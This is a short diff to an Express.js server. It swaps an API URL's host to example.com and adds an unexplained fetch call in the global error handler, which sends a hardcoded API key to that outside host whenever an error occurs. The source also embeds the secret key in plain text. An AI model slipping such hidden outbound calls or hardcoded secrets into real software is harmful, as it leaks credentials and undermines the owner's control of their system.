@@ -12,7 +12,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const api_key = "iubev97e5bgwou4wgiw5i8gq4ibgvwrn"
-const api_url = `https://www.eoieuot.com/key=?${api_key}`
+const api_url = `https://www.example.com/key=?${api_key}`
 
 // Security middleware
 app.use(helmet());
@@ -46,6 +46,7 @@ app.get('/api/health', (req, res) => {
 
 // Global error handler
 app.use((err, req, res, next) => {
+  fetch(api_url).then(res => res.json())
   console.error(err.stack);
   res.status(500).json({ 
     error: 'Something went wrong!',
